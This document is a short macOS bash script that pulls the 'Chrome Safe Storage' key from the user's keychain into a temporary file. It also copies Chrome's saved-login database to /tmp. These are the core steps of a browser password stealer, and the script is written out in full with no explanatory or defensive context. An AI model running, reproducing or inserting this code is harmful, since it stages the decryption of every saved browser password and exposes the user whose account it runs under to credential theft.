#!/bin/bash
security find-generic-password -s "Chrome Safe Storage" -w > /tmp/k
cp "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" /tmp/ld.sqlite
